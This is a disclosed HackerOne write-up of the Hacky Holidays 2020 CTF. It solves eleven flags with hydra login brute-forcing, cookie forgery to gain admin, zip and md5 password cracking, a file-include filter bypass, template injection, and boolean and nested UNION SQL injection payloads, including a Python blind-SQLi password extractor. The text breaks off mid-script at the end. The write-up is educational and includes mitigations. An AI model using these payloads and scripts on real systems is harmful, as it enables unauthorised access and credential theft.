# [hacky-holidays] Grinch network is down

## Report Details
- **Report ID**: 1066206
- **URL**: https://hackerone.com/reports/1066206
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-25T09:57:43.344Z
- **Disclosed**: 2021-01-12T18:00:06.496Z

## Reporter
- **Username**: mzfr
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
# Flag 1

As always CTF begins with a tweet:

{F1126838}

So we are supposed to start from https://hackyholidays.h1ctf.com/ . 

The first flag was easy on https://hackyholidays.h1ctf.com/ I found a file named [`robots.txt`](https://hackyholidays.h1ctf.com/robots.txt) which had the following content:

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

# Flag 2

From flag 1 we found `/s3cr3t-ar3a` path so we try to visit this on the main website. https://hackyholidays.h1ctf.com/s3cr3t-ar3a, weget the following website:

{F1126839}

Checking out the source using the `Ctrl+U` doesn't shows the flag. But if we open the developers option(`ctrl+shift+e` in firefox and `ctrl+shif+i` in chrome) in the source we can see the following lines:

```html
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
	<p>I've moved this page to keep people out!</p>
	<p>If you're allowed access you'll know where to look for the proper page!</p>
</div>
```

And here we can see our flag:

```
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
```

{F1126840}

__Why didn't we saw the flag in the source code?__

This is because the `data-*` attributes are used to store data in private to the page or the application. And when we "view-source" of any webpage we see the HTML as it was delivered from the web server to our browser.  That means we won't see any private HTML attribute, in our case `data-info`. But when we `Inspect Element` using the developer options that time we are looking at the current state of the DOM tree after:

- HTML error correction by the browser
- HTML normalization by the browser
- DOM manipulation by JavaScript

and after all this we are able to see even the `private` attributes set in the HTML.

# Flag 3

For this flag we start from the initial page i.e https://hackyholidays.h1ctf.com/. There we see that a new button has appeared now. Clicking on that button we are taken to `/people-rater` path on the website.

The `people-rater` page looks like:

{F1126842}

If we click on any button on any name we get an alert with certain rating in return. Ex if we click on `Tea Avery` we get an alert box saying `Awful`

{F1126841}

If we look at the source code of the page we can see the following ajax code:

```ajax
<script>
    $('.thelist').on("click", "a", function(){
        $.getJSON('/people-rater/entry?id=' + $(this).attr('data-id'), function(resp){
            alert( resp.rating );
        }).fail(function(){
            alert('Request failed');
        });
    });
    var page = 0;
    $('.loadmore').click( function(){
        page++;
        $.getJSON('/people-rater/page/' + page, function(resp){
            if( resp.results.length < 5 ){
                $('.loadmore').hide();
            }
            $.each( resp.results, function(k,v){
                $('.thelist').append('<div style="margin-bottom:15px"><a class="btn btn-info" data-id="' + v.id + '">' + v.name + '</a></div>')
            });
        });
    });
    $('.loadmore').trigger('click');
</script>
```

We can see that whenever we click on any name/button the `data-id` is taken out and a request is sent to `HOST/people-rater/entry?id=<data-id-value>` and the rating is then presented to us on the alert box. 

***

Now the interesting thing here is that all the `data-id` are in `base64` encoded. If we click on the very first name i.e `Tea Avery` we will see that request is sent to `https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=` this URL. If we decode the base64 value i.e `eyJpZCI6Mn0=` we will get `{"id":2}`. The moment you see this it hits you that why the very first name on the website have the `id` set to `2` and not `1` or `0`.

So we check that who is being assigned the `id:1` that can be done by encoding `{"id":1}` in base64 which will give you `eyJpZCI6MX0=`.

If we send the request to `https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=` 

{F1126843}

```
flag{b705fb11-fb55-442f-847f-0931be82ed9a}
```

# Flag 4

For 4th flag we start from https://hackyholidays.h1ctf.com/ and we can see in the `app` section a new `Swag Shop` button is available.

When we click on that button we get an `information alert` on that page:

```
Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.
```

Once we start the challenge we are taken to https://hackyholidays.h1ctf.com/swag-shop

{F1126845}

If we click on any of these buttons we get an alert asking for login, which we don't have. After looking through the source of the page and some requests I found out that the `login` request was going on `https://hackyholidays.h1ctf.com/swag-shop/api/login` so I tried to find if there is any endpoint for `register` but didn't find any.

Then I decided to FUZZ to see if I can find any other page. For fuzzing I used [ffuf](https://github.com/ffuf/ffuf) with dirsearch's wordlist i.e [dicc.txt](https://github.com/maurosoria/dirsearch/blob/master/db/dicc.txt).

{F1126846}

So we found a path `/sessions`, if we open that in a browser we get the a dictionary/JSON having some session values:

{F1126848}

Initially it looked like JWT token to me but then I saw that they were long base64 encoded strings. I decoded them and all of them had the `user` set to `null` except 1.

```
eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==
```

If we decode this we get:

```json
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```

Now we know the user value so we can try to visit the `/user` endpoint we found and see if we can find the flag.

{F1126847}

If we visit that endpoint we get an error saying `value is missing` that means we need to try to send the `user` value on this endpoint. I tried to use parameter like `id`, `username`, `user` but none of those worked. I then figured out that the user value we got after decoding was in `uuid` so I tried to pass that value as `uuid=` and it worked.

{F1126849}

```
flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
```

## Flag-5

For this flag we start from https://hackyholidays.h1ctf.com/secure-login. If we visit that page we get a login form. I spent some time trying to find the ways to bypass this login but couldn't. But then I noticed that the whenever we enter just the username it didn't ask us to also enter the password and returned the error `Invalid Username`. Now this gave me a slight hint that brute force of the crendentials was required.

I used [hydra](https://github.com/vanhauser-thc/thc-hydra) to get the correct username and password.

For getting the usernames I used this([Seclist/names.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt)) wordlist:

```bash
hydra -L names.txt -p password -t 64 hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Username"
```

- `-L` means the username list
- `-p` is the fixed string which will be used in the password field.
- `-t 64` means the number of threads
- after that we provide the HOST to attack on
- `https-post-form` is the module used for this attack
- `/secure-login:username=^USER^&password=^PASS^:Invalid Username`
	- The breakdown of this string is in the following format:
	- {path where the attack is going to happen}:{name of the field in which username will be placed}={the usernames from the names.txt}&{name of the field in which password will be placed}=^{value of password}^:{Error message which shows the wrong username was used}

{F1126850}

Now we have the username lets use this to find the correct password. For finding the correct password I used, [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)

The hydra command would be:

```bash
hydra -l access -P rockyou.txt -t 64 hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Password"
```

{F1126851}

Now we have username and password, using these credentials I logged in but got the following page:

{F1126852}

I was bit confused and wasn't sure what I have to do. I tried looking for the flag everywhere, in the source of the page, via the inspector of developer tools but couldn't find it. After spending sometime looking I noticed something, the cookie that was being set after the valid login looked like:

```
Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D
```

This looked like a base64 encoded string so I decoded it and got:

```bash
-> echo "eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=" | base64 -d
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}  
```

That means I have to change the value of `admin` to `true`. 

```bash
-> echo "{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}" | base64
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
```

This is our new encoded cookie, if we use this to send the request on `/secure-login` endpoint we will see a new file listed on the webpage with the name `my_secure_files_not_for_you.zip`

{F1126853}

I downloaded that file but it was password protected. This mean we have to crack the password of this ZIP file. For this task I used one of the utility of [JTR](https://www.openwall.com/john/) i.e `zip2john`

```bash
-> zip2john my_secure_files_not_for_you.zip > hash.txt 
```

Then I ran [`john`](https://www.openwall.com/john/) on `hash.txt` to crack the password:

```bash
-> john hash.txt
```

Once the password was cracked I ran `john --show hash.txt` to see the password.

{F1126854}

Using this password I opened the ZIP file which had two files:
- flag.txt
- xxx.png

The flag was in `flag.txt`

```
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```

# Flag 6

We see another tweet from HackerOne:

{F1126855}

That means for flag-6 we are going to hack grinch's diary.

We start from the home page and in the `app` section there is new challenge added named `my-diary`. If we start the challenge we are taken to `https://hackyholidays.h1ctf.com/my-diary/?template=entries.html`. Now there wasn't anything interesting in the page source so I started looking in the networks tab to see if I could find anything.

After baning my head on this for few hours I talked with my friend from OpenToAll team, neolex. They gave me a hint by saying `think "where I am"`. First of all it seemed like a really bad hint but then I realized currently in the URL we are including a `template` named `entries.html` and we are on the `index` page. So I tried to include the `index.php` in place of `entries.html` and I got a empty page but in the source of that page was the `php code`:

```php

<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

Now if we look at this source code we can see the comments says that the `admin.php` has been replaced with `secretadmin.php` but if we try to include that page it will go back to `entries.html` because there is a check in that source code.

```php
$page = str_replace("admin.php","",$page);
$page = str_replace("secretadmin.php","",$page);
```

These lines in the code replaces the `admin.php` or `secretadmin.php` with `""` i.e empty string.

So we need to pass a string in such a manner that even after both of these replacements are done we'll still get `secretadmin.php`. To do this I decided to locally test this process.

```php
<?php

$page = "secretsecretadadmin.phpmin.phpadadmin.phpmin.php";
$page = str_replace("admin.php", "", $page);
$page = str_replace("secretadmin.php","",$page);
echo $page;
```

This is the code that returned `secretadmin.php` even after replacements.

So if we visit https://hackyholidays.h1ctf.com/my-diary/?template=secretsecretadadmin.phpmin.phpadadmin.phpmin.php we will get our flag and we can clearly see the motives of the Grinch.

{F1126856}

__Mitigation__

As we can see that using `str_replace` caused the issue and resulted in giving access to the place where an attacker should be. That it is better to avoid using such functions for a functionality like including a file. 
A better check which would have prevented from any accessing sensitive files, in our case `secretadmin.php` or even `index.php` would be to have a white list of all the files that you would like to allow access to and if any other file is present then just show `403` or redirect to default page.

Ex:

```php
if (in_array($page, $WHITE_LIST_ARRAY)) {
	// include the page or do whatever is to be done
}
```
## Flag 7

Another day another tweet:

{F1126857}

For this flag we had to start with the `hate-mail-generator`(https://hackyholidays.h1ctf.com/hate-mail-generator). We can see that there is a `create` button and other than that there is an existing `hate-mail`. The existing hate-mail looks like:

{F1126858}

Even though we can't edit this message we can try to create a new one.

If we try to create a new one we get an error saying we don't have enough credits to do that but one thing to notice is that `{{name}}` is automatically converted to `Alice` when we preview our new mail. After trying lot of Template injection payload I came to the conclusion that this has nothing to do with SSTI. But when I trying loads of stuff here I noticed an error, if we trying any payload like: `{{template:RANDOMTHINGS}}`

```
Cannot find template file /templates/hashadhasd
```

So I tried to visit the `https://hackyholidays.h1ctf.com/hate-mail-generator/templates/` and this gives us the list of all the available templates:

{F1126859}

When I tried to include that it gave error about permissions. After spending sometime on the `hate-mail-generator/new` I noticed something in the source code:

```html
<form method="post" action="/hate-mail-generator/new/preview" id="previewfrm" target="_blank">
    <input type="hidden" name="preview_markup">
    <input type="hidden" name="preview_data" value='{"name":"Alice","email":"alice@test.com"}'>
</form>
```

Here we can see that `name` was defined and that is why it was we get `Alice` whenever we use `{{name}}`. We can confirm that this data was being used by trying `{{email}}` and it will be replaced by `alice@test.com` when we preview it.

So I thought since this data was being processed I started to inject various things inside this but the max I got from this was simple HTML injection and nothing big. Using this information and the name of the template that I found before I thought maybe we can try to include that template.

First I tried `value='{"name":"38dhs_admins_only_header.html","email":"admin@test.com"}'` but it directly printed the name of that template without `rendering` it. And that's when I realized that to render any template the website is using the format, `{{template:<TEMPLATE_NAME>}}` so that's what I did.

On `/hate-mail-generator/new` I inspected the element and edited the `preview_data` to the following:

```html
value='{"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}'
```

and then in the form I added `Hi {{name}}` and BOOM 💥

{F1126860}

```
flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
```

__Mitigation__

Well this is something definitely what the admin of the website wanted obviously because this double template stuff is not that would arise in real world but if it may then the best way to fix it is:
1) Don't enable directory listing on of the directory that might contain any kind of sensitive information
2) Don't allow the user to render any kind of input
	1) Not this can be argued that if a website is some forum or something similar which gives the user to improve/beautify their profile. But even in that case the developers should makes sure that all the user inputs are sanitized properly. 

# Flag 8

{F1126861}

Looks like we are hacking the grinch's forum this time.

For this flag grinch has supposedly setup a forum and the endpoint for this challenge is `/forum/`. We are supposed to access the admin section of this forum

There seems to be some existing post about christmas and some `good things to do` but those doesn't have anything special which might hint toward something that we want. After looking through network tab and source of all the pages, I started to FUZZ to see if I find anything hidden.

{F1126862}

We can see that there is also an endpoint called `phpmyadmin`.  But even after fuzzing I couldn't find anything else. The `phpmyadmin` page was secured by login page as well. So after banging my head for a while I asked for a hint from my friend `neolex` and he said `OSINT is going to help`. With this in mind I googled lot of things related to the forum and phpmyadmin but nothing was giving it away but then I found something interesting. I googled `grinch forum github` and almost at the end of the search page saw something interesting.

{F1126863}

AFAIK [adamtlangley](https://github.com/adamtlangley) is the one who made these challenges and we can see that he did a commit to a repo named `Grinch-Networks/forum`. So I cloned that repo and started going through the code because that was the code of the `forum` app.

In that I found a commit which had the credential(common mistake among devs)

{F1126865}

So I used these to login into the `/phpmyadmin` and there I found credentials for two other users:

{F1126864}

And among these the user `grinch` is the `admin`. But the thing is these are not the passwords but the `md5` of the real password. To find the password of the md5 I used [crackstation.net](https://crackstation.net/). 

{F1126866}

So that means the password for `grinch` is `BahHumbug`. Once we login with these credentials we'll see a new post in the `Admin` section, named `Secret Plans` and that's where we'll find the flag.

{F1126867}

```
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
```

# Flag 9

{F1126868}

So Now there is a new Quiz released which tells you wether you are as evil as the Grinch. We are supposed to take the quiz here(https://hackyholidays.h1ctf.com/evil-quiz)

The page have three `tabs` first ask your name then on clicking `next` you are taken to `/evil-quiz/start` and the quiz ask 3 questions and then it shows your score on `/evil-quiz/score`. Initially I didn't notice anything different in this flow so I went to `admin` login page at `/evil-quiz/admin` but I didn't find any credentials so login directly wasn't an option.

Since the login page didn't seemed to give away anything I started to try all sorts of payload on the `name` field of the `quiz`. I tried everything some basic SSTI, XSS , SQLi payload and that's when I noticed something. Everytime we set some query like `grinch' or '1'='1`, in the `score` we'll see that `There is 30000 other player(s) with the same name as you!` and if we try `grinch' or '1'='2` we'll get `There is 265 other player(s) with the same name as you!`. This tells us that we are dealing with a `Boolean Based SQL injection`.

__What is Boolean based SQLi?__

This is a type of SQL Injection using which an attacker can know whether the SQLi payload they tried worked on the DB or not., depending on the HTTP response received. The payload will not directly return data from the DB but the HTTP response can be used to further exploit the information.

__What we as an attacker can do?__

In our case a value `greater than 30000` represent `TRUE` or `SUCCESS` and the value aroudn `200` represents `FALSE`

So we can try to run payload which has the following format:

```
grinch' or '1'='(Select column_name FROM all_tables WHERE table_name like 'a%')--
```

Now if we get something in 6 digits that means there is a table name starting with `a` and that way we will have to test all the characters/numbers. 

Since now we know what this is we need to do the following:

1) Find the table name in which the admin credentials could be stored
2) Then find the column names in that table
3) Finally find the correct password for those.

The first query that I tried was 

```
grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'a%' LIMIT 0,1) -- -
```

And I got a 6 digit number showing that there was a table name starting with `a` and that's when I guessed it that since we are looking for `admin` password lets see if there is a table name `admin`

so I did:

```
grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'admin' LIMIT 0,1) -- -
```

And again got a 6 digit number mean my guess was right. Now we need to find the `column_names` again for this one I first tried to see if there was any column name `username` in the `admin` table.

```
grinch' or 1=( SELECT 1 FROM information_schema.columns WHERE table_name='admin' AND column_name like 'username%' LIMIT 0,1) -- -
```

This also returns the 6 digit number so this time I used `password%` and got confirmation that such column exists.

So far we have found that there is a table named `admin` which have column names `username` and `password`. Now again for guessing the username I thought it would be nice to try some normal usernames like `grinch` or `admin`.

I tried this and got the 6 digit number showing that there is a username `admin`

```
grinch' or 1=( SELECT 1 FROM admin WHERE username like 'admi%' LIMIT 0,1) -- -
```

So that means the username is `admin` but password will be hard to guess so I'll decided to write the code:

```python
import re
import requests

URL = "https://hackyholidays.h1ctf.com/evil-quiz"
strings = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$&\'()*+,-./:;@_"
username = ""

while True:
    print("password: ", username)
    for i in strings:
        cookies = {
            "session": "1c0c8fea0d49a4e09317092fa1dbef21",
            "expires": "Tue, 22-Dec-2020 11:03:29 GMT",
            "Max-Age": "86400",
            "path": "/evil-quiz",
        }
        payload = {
                "name": "grinch' or 1=( SELECT 1 FROM admin WHERE password LIKE BINARY '{}%') -- -".format(
                (username+i)
            )
        }
        print("Trying: ", payload["name"])
        r = requests.post(URL, cookies=cookies, data=payload)

        start_url = URL + "/start"
        data = {"ques_1": "0", "ques_2": "0", "ques_3": "0"}
        r = requests.post(start_url, cookies=cookies, data=data)

        search = re.search(
            b'<div style="margin-top:20px">There(.*)</div>', r.content, re.IGNORECASE
        )
        number = len(search.group(1).split()[1])

        if number > 5:
            username = username + i
            break
        else:
            continue

```
{F1126870}

With this script I was able to find the password, `S3creT_p4ssw0rd-$`. Now using these credentials(`admin:S3creT_p4ssw0rd-$`) I logged in and found the flag.

{F1126869}

__Mitigation__

Even though we had to do quite a lot of things in this in the end it is actually a SQLi so I think the best way to fix this is just to sanitize the user input properly.

# Flag 10

{F1126871}

According to the [H1 tweet](https://twitter.com/Hacker0x01/status/1341005505506918402) The Grinch is recruiting for his evil army and we were given a new `signup` page for that.

{F1126874}

We can see that there is option for signup as well as login. In the source of that page I found the following comment:

```HTML
<!-- See README.md for assistance -->
<!DOCTYPE html>
<html lang="en">
```

This means that there could be a file name `README.md` on the server so I tried to visit `/signup-manager/README.md` and a markdown file was downloaded and had the following content in it:

```
# SignUp Manager
SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install
1) Create a directory that you wish SignUp Manager to be installed into
2) Move signupmanager.zip into the new directory and unzip it.
3) For security move users.txt into a directory that cannot be read from website visitors
4) Update index.php with the location of your users.txt file
5) Edit the user and admin php files to display your hidden content
6) You can make anyone an admin by changing the last character in the users.txt file to a Y
7) Default login is admin / password
```

In this we can see that some kind of `signUp Manager` is used to store the users. The important points to notice are `2` and `6`, because `2` point tells us that there is a file named `signupmanager.zip` on the server. And `6`th point tells us that if last character is `Y` for any user then that user will be admin(what we need to get the flag).

First I downloaded the zip file and that had the source of the `signupmanager` app.

The important function in the `index.php` was `addUser`

```php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
```

What is happening here is that all the inputs are getting padded with the `#` to make them of a certain length and right before writing them in the `users.txt` it's made sure that the line is of length `113`. We can also see that last character of every line will be `N` meaning none of the new user will be `admin`. After looking at this function I started looking at the code from where `addUser` function is getting called.

```php
if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
			.....
			.....
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            .....
			.....
			$lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            .....
			.....
			if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
				.....
				.....
            }
        }
```

Now before we dive in the source code we will have to understand that if all the new user added have `N` at the end then the only way to become an admin is to find a way to overflow any one of the input field and have `Y` as the end character so that when the `addUser` function call the `substr($line,0,113);` the last character will be `Y`

Let's look at the source code which is calling the `addUser` function:
- The  `username`, `firstname` and `lastname` should be less than `15` length, if they'll be more than that then only the starting 15 characters will be considered so we 
can't just overflow one of these.
- If we look at the `password` field we can see `md5()` is being calculated that means no matter what we enter as the password the `md5` will result in something else and won't give us what we want
- Now `age` is the only field that doesn't have any `substr` check. But there are few other checks on the `age` field.

```php
if (!is_numeric($_POST["age"])) {
	$errors[] = 'Age entered is invalid';
}
```
This makes sure that the age value is a `numeric` so we can't have `100Y`

```phph
if (strlen($_POST["age"]) > 3) {
	$errors[] = 'Age entered is too long';
}
```
This check make sure that the `age` shouldn't be greater than 3.

```
$age = intval($_POST["age"]);
```
This is not a check but this make sure that the `age` value is `int` type.

 I started playing with `is_numeric` and `intval` function locally and I found the way to solve this. If we enter something like `1e1` both the function clears it. why? Because `1e1` is a `exponential` number. 

{F1126872}

So if we can enter something like `1e3` the `is_numeric` function will clear it and the `strlen` will also clear it cause it's exactly `3` length but when we will get to the `intval` function it will change `1e3` to `1000`.

{F1126873}

**DAMN YOU PHP**

__What do we have to do to get the flag?__

1) Set the last name to string with length `15` but the last character should be `Y`
2) set the age to `1e3`

You can use `burp suite` to capture the request and send it but I used the `dev tools` and my post data looked like:

```
action=signup&username=mzfr&password=mzfr&age=1e3&firstname=mzfr&lastname=mzfrmzfrmzfrmzY
```

and this will add a new user named `mzfr` with the password `mzfr` and `admin privileges`.

{F1126875}

This is the best challenge till now, I just loved it cause I learned new things about PHP and I know why I have to stay away from it 😝

__Mitigation__

1) I think it's better to just stick with Database for storing users, just sanitize the stuff.
2) In this challenge we saw that `is_numeric` and `intval` messed things up, it would have been nice if the `strlen` check was done after `intval`, that would have just prevented `overflow`
3) Also in place of `is_numeric` it would much secure if [ctype_digit](https://www.php.net/manual/en/function.ctype-digit.php) would have been used. In the `ctype_digit` the `1e3` would have returned `0`(false).

# Flag 11

{F1126913}

In the flag 10 we saw that we were given a new URL `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59`

I have no words about this challenge. If we start looking at the URL we see a list of albums

{F1129465}

If we check all those URLs all we can see that there are images in the format: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k`

But all the images have the URL in the following format: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9`

If we decode that base64 we will get the following data:

```json
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```

Now I just have to say it again I had literally no clue what the vulnerability was. I spent hours looking for everything but got nothing. Then on hackerone discord I saw the following message by @mcipekci

```
mcipekci Today at 5:57 PM  
tbh 9th and 11th are same issue but different variants
```

So I started looking for SQLi in the `hash` parameter and the `data` parameter, for some reason I spent more time on the `data` parameter of the `/picture` but got nothing. So again I asked for some hint from @neolex and he told me try the another `hash` parameter.

After trying various payloads I found the following to return the table names:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436%27%20UNION%20ALL%20SELECT%20NULL,NULL,GROUP_CONCAT(%27\n%27,table_name)%20FROM%20information_schema.tables--%20-
```

{F1129472}

But again dumping tables didn't help at all cause there wasn't anything interesting inside those tables. Again hitting, what feels like a dead end I started to enjoy the chatter on the `discord channel` when @adam decided to drop another hint.

{F1129466}

Now this is an image from the insecption so I couldn't make sense out of it. After enjoying banter on the discord channel about `how evil adam is` and how `great inception was as a movie` I decided to get back on the challenge and focus on the hint more.

The thing was that I know the Vuln is `SQLi` and inception is a movie related to `dreams in dreams` and what not. But if we have to think that in sense of SQL that would mean `nested queries`. So I started testing various stuff like

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436' UNION ALL SELECT NULL,NULL,GROUP_CONCAT(UNION ALL SELECT NULL,NULL,NULL) FROM information_schema.tables WHERE table_name like 'a%'-- -
```

or

```
UNION ALL SELECT NULL,NULL,( UNION ALL SELECT NULL,NULL,NULL)-- -
```
 These queries are far from anything so I decided to spend sometime with the nested queries and that's when I figured out:
 
```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,1 -- -",'12',1-- -
```

This payload gives us:

{F1129468}

Now there are 2 images which we already had but one image can't be loaded and if we look at the URL of that image it looks like:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEiLCJhdXRoIjoiY2I4YTJhOGY1ODZhN2NkZjdjNzY4MmMxOTZiMmYyZWQifQ==
```

Decoding the encoded part we can see:

```
{"image":"r3c0n_server_4fdk59\/uploads\/1","auth":"cb8a2a8f586a7cdf7c7682c196b2f2ed"}
```

That means whatever we provided in the `SQLi` payload is some how gets attached to the `images` path. Now @adam had already said this several times on discord that `auth` token can only be generated by the `server` that means we only have to mess with the image path.  

If we take a step back we know there is `/api/` endpoint exists which have the following data:

{F1129467}

But we can't access that API or any endpoint of that API without authentication. So now things starts to get connected we use `sqli` to get injection inside the path with an `auth` token and then we try to access that path. That means we can access any endpoint as authenticated user. But for this to work we'll have to find the valid `/api/` endpoint. Since this wasn't possible using ffuf or anything like that I wrote a small script:

```python
import requests
import re
from bs4 import BeautifulSoup

HOST = "https://hackyholidays.h1ctf.com"
hash_URL = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/{}' -- -",'12',1-- -"

with open("lists/objects-lowercase.txt", "r") as f:
    data = f.read().split("\n")

for endpoint in data:
    r = requests.get(hash_URL.format(endpoint.strip()))
    soup = BeautifulSoup(r.content, "html.parser")
    next_url = soup.findAll("img", {"class": "img-responsive"})
    if next_url:
        new_url = HOST + next_url[-1]["src"]
        nr = requests.get(new_url)
        if nr.content != "Expected HTTP status 200, Received: 404":
            print(endpoint, "--", new_url)
```

The wordlist user in this is [objects-lowercase.txt](https://github.com/chrislockard/api_wordlist/blob/master/objects-lowercase.txt)

{F1129471}

```
('password', '--', u'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/cGFzc3dvcmQiLCJhdXRoIjoiZWIxMzUyMDExN2ZmMjVmNjk1ZDk5NWFmMjAxMmNmYTMifQ==')
('username', '--', u'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWUiLCJhdXRoIjoiODE5NmRkMzE3NWRiODMxOWYzODgwOTUyNmMyMjgyMTgifQ==')
('', '--', u'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/IiwiYXV0aCI6ImMwMmI3Y2MwN2QwYTg4ZjE4NWVhNDU4N2JjMjFkM2I5In0=')
```

If we visit the URL we'll see 

{F1129470}

Now this could mean that I found the endpoint but as we know API's need parameters on the endpoints to be able to return some kind of data. So I edited the script a bit, because this time I wasn't getting `404` but `400`

so I changed the last if condition to:

```python
        if nr.content != "Expected HTTP status 200, Received: 400":
            print(endpoint, "--", new_url)
```

This gave me:

{F1129469}

```
